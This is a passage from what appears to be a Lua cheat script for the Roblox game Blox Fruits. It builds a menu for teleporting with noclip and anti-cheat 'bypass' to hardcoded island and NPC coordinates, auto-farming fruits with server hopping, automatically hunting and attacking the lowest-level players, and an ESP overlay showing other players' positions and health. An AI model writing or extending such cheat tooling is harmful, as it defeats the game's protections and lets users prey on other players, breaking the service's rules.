            WriteSettings()
        end)
        if getgenv().Settings["Spam AWK"] then SpamAWK:UpdateToggle(nil, true) end
        spawn(function()
            pcall(function()
                while wait() do
                    if getgenv().Settings["Spam AWK"] then 
                        game:service('VirtualInputManager'):SendKeyEvent(true, "Y", false, game)
                        game:service('VirtualInputManager'):SendKeyEvent(false, "Y", false, game)
                    end
                end
            end)
        end)


        local TeleportTab = Window:NewTab("Teleport")
        local TeleportToSeaSection = TeleportTab:NewSection("Teleport to sea")
        local ServerTab = Window:NewTab("Server")
        local ServerSection = ServerTab:NewSection("Server")
        TeleportToSeaSection:NewButton("Teleport to first sea", "Teleport to first sea", function()
            ReplicatedStorage.Remotes.CommF_:InvokeServer("TravelMain")
        end)
        TeleportToSeaSection:NewButton("Teleport to second sea", "Teleport to second sea", function()
            teleportToSecondSea()
        end)
        TeleportToSeaSection:NewButton("Teleport to third sea", "Teleport to third sea", function()
            teleportToThirdSea()
        end)
        
        if second_sea then
            IslandPos = {
                ["Cafe"] = CFrame.new(-381.679047, 77.2203598, 260.130615, 0.998160779, 7.18165349e-09, -0.0606226437, -6.2934169e-09, 1, 1.48428274e-08, 0.0606226437, -1.44340042e-08, 0.998160779),
                ["Arowe place"] = CFrame.new(-2020.3894, 125.492752, -75.1585541, -0.186118439, -2.31245778e-08, -0.982527316, 1.71813463e-09, 1, -2.38612738e-08, 0.982527316, -6.1291372e-09, -0.186118439),
                ["Green Zone"] = CFrame.new(-2527.41235, 72.9661179, -3286.44238, 0.726720333, 2.1428963e-09, 0.686933458, -2.89159297e-09, 1, -6.04382031e-11, -0.686933458, -1.94241023e-09, 0.726720333),
                ["Hot and Cold"] = CFrame.new(-5772.93457, 20.2020435, -4955.99072, -0.190426946, 8.08608824e-09, 0.981701374, -3.21236437e-09, 1, -8.85993323e-09, -0.981701374, -4.84075269e-09, -0.190426946),
                ["Colosseum"] = CFrame.new(-1834.76782, 45.7947006, 1499.06641, -0.999703407, 6.79347281e-08, -0.0243541766, 6.99724936e-08, 1, -8.28199305e-08, 0.0243541766, -8.44994901e-08, -0.999703407),
                ["Cursed Ship"] = CFrame.new(923.941711, 125.057106, 32945.1016, -0.999903142, -6.41719495e-08, -0.0139173511, -6.55000747e-08, 1, 9.49734584e-08, 0.0139173511, 9.58758477e-08, -0.999903142),
                ["Zombie Island"] = CFrame.new(-5508.83838, 48.4801178, -921.756409, 0.645064175, 5.74061954e-09, -0.764128387, 7.40661577e-08, 1, 7.00380269e-08, 0.764128387, -1.01775072e-07, 0.645064175),
                ["Snow Mountain"] = CFrame.new(984.71875, 429.421875, -5224.56689, 0.410833359, -3.39381678e-08, 0.911710441, 2.1759778e-08, 1, 2.74193699e-08, -0.911710441, 8.57382432e-09, 0.410833359),
                ["Ice Castle"] = CFrame.new(6092.85791, 294.386688, -6687.76562, 0.552581847, -5.16517717e-09, -0.833458662, 1.64160396e-09, 1, -5.10889953e-09, 0.833458662, 1.45487611e-09, 0.552581847),
                ["Forgotten Island"] = CFrame.new(-3155.89551, 298.66449, -10544.9893, -0.998934627, 2.08474251e-08, -0.0461482927, 1.69908887e-08, 1, 8.39606216e-08, 0.0461482927, 8.30870661e-08, -0.998934627),
                ["Darkbeard Arena"] = CFrame.new(3738.17676, 100.6501837, -3449.45483, 0.807372749, 2.30504718e-08, -0.590041697, 9.58726787e-09, 1, 5.21843972e-08, 0.590041697, -4.77891504e-08, 0.807372749),
                ["Law Laboratory"] = CFrame.new(-5531.46436, 328.953278, -5939.38232, 0.99832046, 3.13601456e-09, 0.0579328425, -5.91816951e-09, 1, 4.78522182e-08, -0.0579328425, -4.81147033e-08, 0.99832046),
                ["Raid Room"] = CFrame.new(-6505.47021, 249.531616, -4480.81445, 0.190456197, -5.0886233e-09, -0.981695712, 2.66903371e-08, 1, -5.38176101e-12, 0.981695712, -2.62007642e-08, 0.190456197),
                ["Swan room"] = CFrame.new(2287.2063, 15.1520348, 837.542542, 0.997465432, 3.42148105e-08, -0.0711523443, -3.17858344e-08, 1, 3.52698919e-08, 0.0711523443, -3.29188623e-08, 0.997465432),
                ["Mansion"] = CFrame.new(-389.768494, 331.860565, 685.700256, 0.992786944, -4.46675372e-08, -0.119891919, 4.67511327e-08, 1, 1.45662709e-08, 0.119891919, -2.00662864e-08, 0.992786944),
                ["Start position"] = CFrame.new(-20.1357784, 19.2767277, 2828.39429, 0.998764515, 0, -0.0496935807, 0, 1, 0, 0.0496935807, 0, 0.998764515),
            }
            NPCPos = {
                ["Sea Captain"] = CFrame.new(91.8420105, 19.2767277, 2833.7854, 0.0328539163, 8.44573549e-08, -0.999460161, 4.0394589e-08, 1, 8.58308127e-08, 0.999460161, -4.31926601e-08, 0.0328539163),
                ["King Red Head"] = CFrame.new(-1927.43982, 12.8198519, 1738.24329, -0.975165844, -1.66522227e-08, 0.22147578, -3.06991677e-09, 1, 6.16705975e-08, -0.22147578, 5.94591505e-08, -0.975165844),
                ["Arowe"] = CFrame.new(-2020.3894, 125.492752, -75.1585541, -0.186118439, -2.31245778e-08, -0.982527316, 1.71813463e-09, 1, -2.38612738e-08, 0.982527316, -6.1291372e-09, -0.186118439),
                ["Trevor"] = CFrame.new(-336.726624, 331.860565, 646.967407, 0.304350466, 5.17507992e-08, -0.952560127, -5.24115045e-08, 1, 3.75822289e-08, 0.952560127, 3.84869381e-08, 0.304350466),
                ["Alchemist"] = CFrame.new(-2779.698, 72.9661179, -3574.21094, -0.738383949, -3.42040423e-08, -0.674380541, -2.87388247e-08, 1, -1.92528642e-08, 0.674380541, 5.1648974e-09, -0.738383949),
                ["Bartilo"] = CFrame.new(-459.294189, 73.0200729, 300.489349, 0.311311901, -8.80943176e-08, 0.950307786, 7.91016816e-08, 1, 6.67878552e-08, -0.950307786, 5.43790897e-08, 0.311311901),
                ["True Triple Katana Guy"] = CFrame.new(-2570.1438, 1623.62756, -3742.23755, 0.338274449, 6.07209785e-08, 0.94104749, 5.74162584e-08, 1, -8.51640607e-08, -0.94104749, 8.2840252e-08, 0.338274449),
                ["Law Chip Guy"] = CFrame.new(-4971.53271, 143.731888, -5390.03809, 0.529998064, -8.96415173e-08, 0.847998857, 4.93730319e-08, 1, 7.48514069e-08, -0.847998857, 2.19717267e-09, 0.529998064),
                ["Mysterious Scientist"] = CFrame.new(-6434.44141, 250.619507, -4500.30078, 0.74296844, 1.60236375e-08, -0.669326484, -9.17431109e-09, 1, 1.37562379e-08, 0.669326484, -4.07984135e-09, 0.74296844),
                ["El Rodolfo"] = CFrame.new(941.813538, 40.4428635, 32776.4297, -0.990710258, -3.78767453e-08, 0.135989532, -2.74683352e-08, 1, 7.84147218e-08, -0.135989532, 7.3950865e-08, -0.990710258),
                ["El Perro"] = CFrame.new(633.295593, 130.597015, 33220.1289, -0.999032795, 6.67597249e-08, 0.0439718179, 6.54874057e-08, 1, -3.03754852e-08, -0.0439718179, -2.74665055e-08, -0.999032795),
                ["El Admin"] = CFrame.new(1322.41309, 125.43914, 33136.4375, 0.714200675, 5.21663546e-10, -0.699940979, -1.14109902e-10, 1, 6.28861851e-10, 0.699940979, -3.6926337e-10, 0.714200675),
                ["Experimic"] = CFrame.new(916.359558, 129.555984, 33450.1914, -0.989536464, -4.57067495e-09, 0.144282907, -4.12639656e-09, 1, 3.37846595e-09, -0.144282907, 2.7477467e-09, -0.989536464),
                ["Blox Fruit Gacha"] = CFrame.new(-422.505066, 72.9597549, 388.921509, 0.999904692, -3.36936061e-08, -0.0138063869, 3.36184627e-08, 1, -5.67464209e-09, 0.0138063869, 5.20995158e-09, 0.999904692),
                ["Blox Fruit Dealer"] = CFrame.new(-449.981079, 73.0200729, 357.801483, -0.0330029204, 6.85504844e-08, 0.999455273, 1.72488139e-08, 1, -6.80182737e-08, -0.999455273, 1.49946153e-08, -0.0330029204),
                ["Title/Color Specialist"] = CFrame.new(-350.412598, 16.0200996, 307.551544, -0.0483315699, 4.33923759e-08, -0.998831332, 4.44134294e-08, 1, 4.12940615e-08, 0.998831332, -4.23657163e-08, -0.0483315699),
                ["Plokster"] = CFrame.new(-1889.18433, 88.3578491, -1905.7063, 0.831714571, -6.32608348e-08, 0.555203438, 8.577247e-08, 1, -1.45485135e-08, -0.555203438, 5.97213798e-08, 0.831714571),
            }
            IslandNames = {
                "Cafe",
                "Arowe place",
                "Green Zone",
                "Hot and Cold",
                "Colosseum",
                "Cursed Ship",
                "Zombie Island",
                "Snow Mountain",
                "Ice Castle",
                "Forgotten Island",
                "Darkbeard Arena",
                "Law Laboratory",
                "Raid Room",
                "Swan room",
                "Mansion",
                "Start position"
            }
            NPCNames = {
                "Sea Captain",
                "King Red Head",
                "Arowe",
                "Trevor",
                "Alchemist",
                "Bartilo",
                "True Triple Katana Guy",
                "Law Chip Guy",
                "Mysterious Scientist",
                "El Rodolfo",
                "El Perro",
                "El Admin",
                "Experimic",
                "Blox Fruit Gacha",
                "Blox Fruit Dealer",
                "Title/Color Specialist",
                "Plokster"
            }
        end
        if third_sea then
            IslandPos = {
                ["Mansion"] = CFrame.new(-12550.6885, 337.168274, -7513.34277, 0.999895096, 0, 0.01448303, 0, 1, 0, -0.01448303, 0, 0.999895096),
                ["Hydra Island"] = CFrame.new(5256.84521, 601.603638, 616.78363, -0.999633908, -6.08200734e-09, -0.0270565897, -6.38501385e-09, 1, 1.11126006e-08, 0.0270565897, 1.12812888e-08, -0.999633908),
                ["Port Town"] = CFrame.new(-303.432922, 6.72993994, 5312.11426, 0.950251818, 0, -0.311482787, 0, 1, 0, 0.311482787, 0, 0.950251818),
                ["Haunted Castle"] = CFrame.new(-9500.35352, 142.104813, 5868.80713, -0.999827981, 1.17699637e-08, -0.0185488295, 1.23603714e-08, 1, -3.17152917e-08, 0.0185488295, -3.19391056e-08, -0.999827981),
                ["Castle on the Sea"] = CFrame.new(-5087.12158, 314.515503, -2978.61523, -0.40476504, 3.7508137e-08, 0.914420724, 1.00039621e-08, 1, -3.65902508e-08, -0.914420724, -5.66262415e-09, -0.40476504),
                ["Floating Turtle"] = CFrame.new(-10842.5586, 331.723206, -9248.37598, -0.184897989, 0, 0.982757747, 0, 1, 0, -0.982757747, 0, -0.184897989),
                ["Ice Cream Island"] = CFrame.new(-621.127686, 126.871155, -11040.8545, -0.503357649, -4.11361825e-08, -0.864078164, -2.85817112e-08, 1, -3.09571071e-08, 0.864078164, 9.11433595e-09, -0.503357649),
                ["Peanut Island"] = CFrame.new(-2181.91528, 88.2388306, -10513.2871, 0.115819328, 2.167112e-08, -0.993270278, 7.09502004e-08, 1, 3.00910266e-08, 0.993270278, -7.39578496e-08, 0.115819328),
                ["Cake Island"] = CFrame.new(-2131.6665, 69.9830399, -12273.0225, -0.977835476, -6.95206595e-08, -0.209374622, -5.05051609e-08, 1, -9.616695e-08, 0.209374622, -8.34609537e-08, -0.977835476),
                ["Great Tree"] = CFrame.new(2940.33911, 2280.61816, -7197.37891, 0.871008873, 8.15059948e-08, -0.491267264, -6.67008138e-08, 1, 4.7650218e-08, 0.491267264, -8.73583428e-09, 0.871008873),
            }
            NPCPos = {
                ["Uzoth"] = CFrame.new(-9784.63281, 851.815735, 6668.09277, -0.0881351829, -1.32053213e-08, -0.996108532, 5.9710402e-08, 1, -1.85400566e-08, 0.996108532, -6.11120683e-08, -0.0881351829),
                ["Previous Hero"] = CFrame.new(-10368, 332, -10128),
                ["Sea 2 Fighting Styles"] = CFrame.new(-5035.29492, 314.515503, -3189.82471, 0.924805701, 0, 0.380439758, 0, 1, 0, -0.380439758, 0, 0.924805701),
                ["Mysterious Scientist"] = CFrame.new(-5016.1416, 314.818207, -2823.27783, -0.932020426, 0, -0.362405717, 0, 1, 0, 0.362405717, 0, -0.932020426),
                ["Butler"] = CFrame.new(-5129.07715, 315.415466, -3125.02295, 0.485516787, 0, -0.874227345, 0, 1, 0, 0.874227345, 0, 0.485516787),
                ["Elite Hunter"] = CFrame.new(-5431.4668, 313.768921, -2829.01245, -0.926955104, -1.04650994e-07, -0.375172317, -1.06914023e-07, 1, -1.47838799e-08, 0.375172317, 2.64071875e-08, -0.926955104),
                ["Player Hunter"] = CFrame.new(-5554.97119, 313.768921, -2839.86304, -0.74428612, -3.15137747e-08, 0.667860866, -4.87426739e-08, 1, -7.13430337e-09, -0.667860866, -3.78632876e-08, -0.74428612),
                ["Blox Fruit Gacha"] = CFrame.new(-12505.0684, 336.914368, -7454.92725, -0.903258443, -1.02848034e-07, -0.429096937, -1.10697549e-07, 1, -6.66409239e-09, 0.429096937, 4.14805825e-08, -0.903258443),
            }
            IslandNames = {
                "Mansion",
                "Hydra Island",
                "Port Town",
                "Haunted Castle",
                "Castle on the Sea",
                "Floating Turtle",
                "Ice Cream Island",
                "Peanut Island",
                "Cake Island",
                "Great Tree"
            }
            NPCNames = {
                "Uzoth",
                "Previous Hero",
                "Sea 2 Fighting Styles",
                "Mysterious Scientist",
                "Butler",
                "Elite Hunter",
                "Player Hunter",
                "Blox Fruit Gacha"
            }
        end
        _G.SelectedIslandPos = nil
        _G.SelectedNPCPos = nil
        _G.TweenToIsland = false
        _G.TweenToNPC = false
        TeleportToSeaSection:NewLabel(" ")
        TeleportToSeaSection:NewButton("STOP EBANIY TWEEN", "STOP EBANIY TWEEN", function()
            StopTween()
        end)

        local TeleportToIslandSection = TeleportTab:NewSection("Teleport to island")
        TeleportToIslandSection:NewDropdown("Select island", "Select island", IslandNames or {}, function(currentOption)
            _G.SelectedIslandPos = IslandPos[currentOption] or nil
        end)
        
        TeleportToIslandSection:NewToggle("Tween to island", "Tween to island", function(state)
            _G.TweenToIsland = state
            if not state then 
                NoClip = false 
                StopTween()
            end

        end)
        local TeleportToNPCSection = TeleportTab:NewSection("Teleport to NPC")
        TeleportToNPCSection:NewDropdown("Select NPC", "Select NPC", NPCNames or {}, function(currentOption)
            _G.SelectedNPCPos = NPCPos[currentOption] or nil
        end)
        TeleportToNPCSection:NewToggle("Tween to NPC", "Tween to NPC", function(state)
            _G.TweenToNPC = state
            if not state then
                NoClip = false 
                StopTween()
            end
        end)
        task.spawn(function()
            while task.wait() do
                pcall(function()
                    if _G.TweenToIsland then
                        if not _G.SelectedIslandPos then 
                            NoClip = false
                        else
                            if getDistance(_G.SelectedIslandPos) > 500 then
                                NoClip = true
                            else
                                NoClip = false
                            end
                        end
                        if _G.SelectedIslandPos then
                            if _G.UseBypassTP then
                                if getDistance(_G.SelectedIslandPos) > 5000 then
                                    Bypass(_G.SelectedIslandPos)
                                end
                            end
                            if getDistance(_G.SelectedIslandPos) > 2000 then
                                useNearestEntrance(_G.SelectedIslandPos)
                                wait(1)
                            end
                            tweenToPointAdvanced(_G.SelectedIslandPos)
                        end
                    end
                end)
            end
        end)
        task.spawn(function()
            while task.wait() do
                pcall(function()
                    if _G.TweenToNPC then
                        if not _G.SelectedNPCPos then 
                            NoClip = false
                        else
                            if getDistance(_G.SelectedNPCPos) > 500 then
                                NoClip = true
                            else
                                NoClip = false
                            end
                        end
                        if _G.SelectedNPCPos then
                            if _G.UseBypassTP then
                                if getDistance(_G.SelectedNPCPos) > 5000 then
                                    Bypass(_G.SelectedNPCPos)
                                end
                            end
                            tweenToPointAdvanced(_G.SelectedNPCPos)
                        end
                    end
                end)
            end
        end)

        local StatsSection = MainTab:NewSection("Stats")
        -- –°–¢–ê–¢–´
        StatsSection:NewToggle("Melee", "Melee", function(state)
            _G.LearnMelee = state
        end)
        StatsSection:NewToggle("Defense", "Defense", function(state)
            _G.LearnDefense = state
        end)
        StatsSection:NewToggle("Sword", "Sword", function(state)
            _G.LearnSword = state
        end)
        StatsSection:NewToggle("Gun", "Gun", function(state)
            _G.LearnGun = state
        end)
        StatsSection:NewToggle("Fruit", "Fruit", function(state)
            _G.LearnFruit = state
        end)
        StatsSection:NewSlider("Learn Rate", "Learn Rate", 1, 30, function(s) -- 500 (MaxValue) | 0 (MinValue)
            _G.LearnRate = s
        end)

        local ShopTab = Window:NewTab("Shop")
        local BonesShopSection = ShopTab:NewSection("Bones")
        BonesShopSection:NewButton("Random Surprise [50 bones]", "Random Surprise", function()
            ReplicatedStorage.Remotes.CommF_:InvokeServer("Bones", "Buy", 1, 1)
        end)
        local FragmentsShopSection = ShopTab:NewSection("Fragments")
        FragmentsShopSection:NewButton("Reset Stats [2500 FRAG]", "Reset Stats", function()
            ReplicatedStorage.Remotes.CommF_:InvokeServer("BlackbeardReward","Refund","1")
            ReplicatedStorage.Remotes.CommF_:InvokeServer("BlackbeardReward","Refund","2")
        end)
        FragmentsShopSection:NewButton("Reroll Race [3000 FRAG]", "Reset Stats", function()
            ReplicatedStorage.Remotes.CommF_:InvokeServer("BlackbeardReward","Reroll","1")
            ReplicatedStorage.Remotes.CommF_:InvokeServer("BlackbeardReward","Reroll","2")
        end)
        local FruitSection = ShopTab:NewSection("Fruit")
        FruitSection:NewButton("Open Fruit Shop", "Open Fruit Shop", function()
            local args = {
                [1] = "GetFruits"
            }
            ReplicatedStorage.Remotes.CommF_:InvokeServer(unpack(args))
            LP.PlayerGui.Main.FruitShop.Visible = true
        end)
        FruitSection:NewButton("Buy Random Fruit", "Random Fruit", function()
            ReplicatedStorage.Remotes.CommF_:InvokeServer("Cousin" , "Buy")
        end)
        FruitSection:NewLabel(" ")
        AutoStoreFruit = FruitSection:NewToggle("Auto Store Fruit", "Fruit", function(state)
            getgenv().Settings["Auto Store Fruit"] = state
            WriteSettings()
            _G.AutoStoreFruit = state
        end)
        if getgenv().Settings["Auto Store Fruit"] then AutoStoreFruit:UpdateToggle(nil, true) end 
        AutoFarmFruits = FruitSection:NewToggle("Auto Farm Fruits [Bypass TP]", "Fruit", function(state)
            getgenv().Settings["Auto Farm Fruits"] = state
            WriteSettings()
            _G.AutoFarmFruits = state
            _G.ActivateBypassDefense = state
        end)
        if getgenv().Settings["Auto Farm Fruits"] then AutoFarmFruits:UpdateToggle(nil, true) end 
        HopWhenNoFruits = FruitSection:NewToggle("Hop When No Fruits On Server", "Fruit", function(state)
            getgenv().Settings["Hop When No Fruits On Server"] = state
            WriteSettings()
            _G.HopWhenNoFruits = state
        end)
        if getgenv().Settings["Hop When No Fruits On Server"] then HopWhenNoFruits:UpdateToggle(nil, true) end 

        spawn(function() 
            while wait() do
                if _G.AutoStoreFruit then
                    pcall(function()
                        if isFruitsInInventory() then
                            wait(.05)
                            storeAllFruits()
                        end
                    end)
                end
            end
        end)
        spawn(function() 
            while wait() do
                if _G.AutoFarmFruits then
                    pcall(function()
                        if isFruitsOnServer() then
                            takeFruits()
                        end
                    end)
                end
            end
        end)
        spawn(function() 
            while wait() do
                if _G.ActivateBypassDefense then
                    pcall(function()
                        if not isFruitsInInventory() then
                            wait(4)
                            if not isFruitsInInventory() then
                                ReplicatedStorage.Remotes.CommF_:InvokeServer("SetTeam","Pirates")
                            end
                        end
                    end)
                end
            end
        end)

        spawn(function() 
            while wait() do
                if _G.HopWhenNoFruits and _G.AutoFarmFruits then
                    wait(5)
                    pcall(function()
                        if not isWorthFruitInInventory() and not isFruitsInInventory() and not isFruitsOnServer() and _G.HopWhenNoFruits and _G.AutoFarmFruits then
                            HopServer()
                        end
                    end)
                end
            end
        end)
        
        local PvPTab = Window:NewTab("PvP")
        local KillSection = PvPTab:NewSection("Kill Players")
        KillSection:NewToggle("Kill Lowest Level Player", "Kill Lowest Level Player", function(state)
            _G.KillPlayer = state
        end)

        spawn(function()
            while wait() do
                pcall(function()
                    if _G.KillPlayer then
                        prevLevel = math.huge
                        plr = nil
                        for i,v in pairs(game.Players:GetChildren()) do
                            if v.Data.Level.Value > 20 and v.Name ~= LP.Name and v.Data.Level.Value < prevLevel then
                                if LP.Data.Level.Value - v.Data.Level.Value > -500 or LP.Data.Level.Value - v.Data.Level.Value < 500 then
                                    prevLevel = v.Data.Level.Value
                                    plr = v
                                end
                            end
                        end
                        if plr then
                            _G.AimbotPos = plr.Character.HumanoidRootPart.Position
                            useNearestEntrance(plr.Character.HumanoidRootPart.CFrame * CFrame.new(0,5,0))
                            followTarget(plr.Character.HumanoidRootPart.CFrame * CFrame.new(0,5,0))
                            if getDistance(plr.Character.HumanoidRootPart.CFrame) < 40 then
                                if not LP.Character:FindFirstChildOfClass("Tool") then
                                    for i,v in pairs(LP.Backpack:GetChildren()) do
                                        if string.find(v.Name, "-") then
                                            LP.Character.Humanoid:EquipTool(v)
                                        end
                                    end
                                end
                                game:service('VirtualInputManager'):SendKeyEvent(true, "Z", false, game)
                                wait(.5)
                                game:service('VirtualInputManager'):SendKeyEvent(false, "Z", false, game)
                            end
                        end
                    end
                end)
            end
        end)

        local EspTab = Window:NewTab("ESP")
        local EspSection = EspTab:NewSection("ESP")
        EspSection:NewToggle("Player ESP", "Player ESP", function(state)
            _G.PlayerESP = state
        end)


        spawn(function()
            while wait() do
                pcall(function()
                    if _G.PlayerESP then
                        for i,v in pairs(game.Players:GetChildren()) do
                            if v.Name ~= LP.Name then
                                if not v.Character.HumanoidRootPart:FindFirstChild("PlayersEsp") then
                                    local BillboardGui = Instance.new("BillboardGui")
                                    local TextLabel = Instance.new("TextLabel")
                                    BillboardGui.Parent = v.Character.HumanoidRootPart
                                    BillboardGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
                                    BillboardGui.Active = true
                                    BillboardGui.Name = "PlayersEsp"
                                    BillboardGui.AlwaysOnTop = true
                                    BillboardGui.LightInfluence = 1.000
                                    BillboardGui.Size = UDim2.new(0, 200, 0, 50)
                                    BillboardGui.StudsOffset = Vector3.new(0, 2.5, 0)
                                    TextLabel.Parent = BillboardGui
                                    TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                                    TextLabel.BackgroundTransparency = 1.000
                                    TextLabel.Size = UDim2.new(0, 200, 0, 50)
                                    TextLabel.Font = Enum.Font.GothamBold
                                    TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
                                    TextLabel.TextSize = 13
                                    TextLabel.TextStrokeTransparency = 0
                                    TextLabel.TextWrapped = true
                                end
                                local Dis = math.floor((LP.Character.HumanoidRootPart.Position - v.Character.HumanoidRootPart.Position).Magnitude / 10)
                                v.Character.HumanoidRootPart:FindFirstChild("PlayersEsp").TextLabel.Text = v.Name.."\n"..Dis.." m".."\n["..math.floor(v.Character.Humanoid.Health).."/"..v.Character.Humanoid.MaxHealth.." HP]"
                                if v.Team == LP.Team then
                                    v.Character.HumanoidRootPart:FindFirstChild("PlayersEsp").TextLabel.TextStrokeColor3 = Color3.new(255,0,0)
                                else
                                    v.Character.HumanoidRootPart:FindFirstChild("PlayersEsp").TextLabel.TextStrokeColor3 = Color3.new(0,255,255)
                                end
                            end
                        end
                    else
                        for i,v in pairs(game.Players:GetChildren()) do
                            if v.Name ~= LP.Name then
                                if v.Character.HumanoidRootPart:FindFirstChild("PlayersEsp") then
                                    v.Character.HumanoidRootPart.PlayersEsp:Destroy()
                                end
                            end
                        end
                    end
                end)
            end
        end)
        
        EspSection:NewToggle("Island ESP", "Island ESP", function(state)
            _G.IslandESP = state
        end)
        EspSection:NewToggle("Chest ESP", "Chest ESP", function(state)
            _G.ChestESP = state
        end)

        local FunTab = Window:NewTab("Fun Functions")
        local AnimationSection = FunTab:NewSection("Anims")

        AnimationSection:NewButton("Backflip4ik", "1", function()
            humanoid = LP.Character.Humanoid
            humanoidDescription = humanoid.HumanoidDescription
            emoteTable = {
                ["Backflip4ik"] = {15694504637},
            }
            humanoidDescription:SetEmotes(emoteTable)
            -- Equip emotes in a specific order
            equippedEmotes = {"Backflip4ik"}
            humanoidDescription:SetEquippedEmotes(equippedEmotes)
            humanoid:PlayEmote("Backflip4ik")
        end)

        AnimationSection:NewButton("Bouncy Twirl", "1", function()
            humanoid = LP.Character.Humanoid
            humanoidDescription = humanoid.HumanoidDescription
            emoteTable = {
                ["Bouncy Twirl"] = {14353423348},
            }
            humanoidDescription:SetEmotes(emoteTable)
            -- Equip emotes in a specific order
            equippedEmotes = {"Bouncy Twirl"}
            humanoidDescription:SetEquippedEmotes(equippedEmotes)
            humanoid:PlayEmote("Bouncy Twirl")
        end)
        AnimationSection:NewButton("Face Frame", "1", function()
            humanoid = LP.Character.Humanoid
            humanoidDescription = humanoid.HumanoidDescription
            emoteTable = {
                ["Face Frame"] = {14353421343},
            }
            humanoidDescription:SetEmotes(emoteTable)
            -- Equip emotes in a specific order
            equippedEmotes = {"Face Frame"}
            humanoidDescription:SetEquippedEmotes(equippedEmotes)
            humanoid:PlayEmote("Face Frame")
        end)
        AnimationSection:NewButton("Strut", "1", function()
            humanoid = LP.Character.Humanoid
            humanoidDescription = humanoid.HumanoidDescription
            emoteTable = {
                ["Bouncy Twirl"] = {14353423348},
                ["Face Frame"] = {14353421343},
                ["Strut"] = {14353425085},
                ["Backflip"] = {15694504637},
                ["Bone Chillin' Bop"] = {15123050663},
                ["BLACKPINK 1"] = {14901369589},
                ["BLACKPINK 2"] = {14548710952},
                ["Mean Girls Dance Break"] = {15963348695},
                ["Breakdance"] = {5915773992}
            }
            humanoidDescription:SetEmotes(emoteTable)
            -- Equip emotes in a specific order
            equippedEmotes = {"Bouncy Twirl", "Face Frame", "Strut", "Bone Chillin' Bop", "BLACKPINK 1", "BLACKPINK 2", "Mean Girls Dance Break", "Breakdance"}
            humanoidDescription:SetEquippedEmotes(equippedEmotes)
            humanoid:PlayEmote("Strut")
        end)
        AnimationSection:NewButton("Bone Chillin' Bop", "1", function()
            humanoid = LP.Character.Humanoid
            humanoidDescription = humanoid.HumanoidDescription
            emoteTable = {
                ["Bouncy Twirl"] = {14353423348},
                ["Face Frame"] = {14353421343},
                ["Strut"] = {14353425085},
                ["Backflip"] = {15694504637},
                ["Bone Chillin' Bop"] = {15123050663},
                ["BLACKPINK 1"] = {14901369589},
                ["BLACKPINK 2"] = {14548710952},
                ["Mean Girls Dance Break"] = {15963348695},
                ["Breakdance"] = {5915773992}
            }
            humanoidDescription:SetEmotes(emoteTable)
            -- Equip emotes in a specific order
            equippedEmotes = {"Bouncy Twirl", "Face Frame", "Strut", "Bone Chillin' Bop", "BLACKPINK 1", "BLACKPINK 2", "Mean Girls Dance Break", "Breakdance"}
            humanoidDescription:SetEquippedEmotes(equippedEmotes)
            humanoid:PlayEmote("Bone Chillin' Bop")
        end)
        AnimationSection:NewButton("BLACKPINK 1", "1", function()
            humanoid = LP.Character.Humanoid
            humanoidDescription = humanoid.HumanoidDescription
            emoteTable = {
                ["Bouncy Twirl"] = {14353423348},
                ["Face Frame"] = {14353421343},
                ["Strut"] = {14353425085},
                ["Backflip"] = {15694504637},
                ["Bone Chillin' Bop"] = {15123050663},
                ["BLACKPINK 1"] = {14901369589},
                ["BLACKPINK 2"] = {14548710952},
                ["Mean Girls Dance Break"] = {15963348695},
                ["Breakdance"] = {5915773992}
            }
            humanoidDescription:SetEmotes(emoteTable)
            -- Equip emotes in a specific order
            equippedEmotes = {"Bouncy Twirl", "Face Frame", "Strut", "Bone Chillin' Bop", "BLACKPINK 1", "BLACKPINK 2", "Mean Girls Dance Break", "Breakdance"}
            humanoidDescription:SetEquippedEmotes(equippedEmotes)
            humanoid:PlayEmote("BLACKPINK 1")
        end)
        AnimationSection:NewButton("BLACKPINK 2", "1", function()
            humanoid = LP.Character.Humanoid
            humanoidDescription = humanoid.HumanoidDescription
            emoteTable = {
                ["Bouncy Twirl"] = {14353423348},
                ["Face Frame"] = {14353421343},
                ["Strut"] = {14353425085},
                ["Backflip"] = {15694504637},
                ["Bone Chillin' Bop"] = {15123050663},
                ["BLACKPINK 1"] = {14901369589},
                ["BLACKPINK 2"] = {14548710952},
                ["Mean Girls Dance Break"] = {15963348695},
                ["Breakdance"] = {5915773992}
            }
            humanoidDescription:SetEmotes(emoteTable)
            -- Equip emotes in a specific order
            equippedEmotes = {"Bouncy Twirl", "Face Frame", "Strut", "Bone Chillin' Bop", "BLACKPINK 1", "BLACKPINK 2", "Mean Girls Dance Break", "Breakdance"}
            humanoidDescription:SetEquippedEmotes(equippedEmotes)
            humanoid:PlayEmote("BLACKPINK 2")
        end)
        AnimationSection:NewButton("Mean Girls Dance Break", "1", function()
            humanoid = LP.Character.Humanoid
            humanoidDescription = humanoid.HumanoidDescription
            emoteTable = {
                ["Bouncy Twirl"] = {14353423348},
                ["Face Frame"] = {14353421343},
                ["Strut"] = {14353425085},
                ["Backflip"] = {15694504637},
                ["Bone Chillin' Bop"] = {15123050663},
                ["BLACKPINK 1"] = {14901369589},
                ["BLACKPINK 2"] = {14548710952},
                ["Mean Girls Dance Break"] = {15963348695},
                ["Breakdance"] = {5915773992}
            }
            humanoidDescription:SetEmotes(emoteTable)
            -- Equip emotes in a specific order
            equippedEmotes = {"Bouncy Twirl", "Face Frame", "Strut", "Bone Chillin' Bop", "BLACKPINK 1", "BLACKPINK 2", "Mean Girls Dance Break", "Breakdance"}
            humanoidDescription:SetEquippedEmotes(equippedEmotes)
            humanoid:PlayEmote("Mean Girls Dance Break")
        end)
        AnimationSection:NewButton("Breakdance", "1", function()
            humanoid = LP.Character.Humanoid
            humanoidDescription = humanoid.HumanoidDescription
            emoteTable = {
                ["Bouncy Twirl"] = {14353423348},
                ["Face Frame"] = {14353421343},
                ["Strut"] = {14353425085},
                ["Backflip"] = {15694504637},
                ["Bone Chillin' Bop"] = {15123050663},
                ["BLACKPINK 1"] = {14901369589},
                ["BLACKPINK 2"] = {14548710952},
                ["Mean Girls Dance Break"] = {15963348695},
                ["Breakdance"] = {5915773992}
            }
            humanoidDescription:SetEmotes(emoteTable)
            -- Equip emotes in a specific order
            equippedEmotes = {"Bouncy Twirl", "Face Frame", "Strut", "Bone Chillin' Bop", "BLACKPINK 1", "BLACKPINK 2", "Mean Girls Dance Break", "Breakdance"}
            humanoidDescription:SetEquippedEmotes(equippedEmotes)
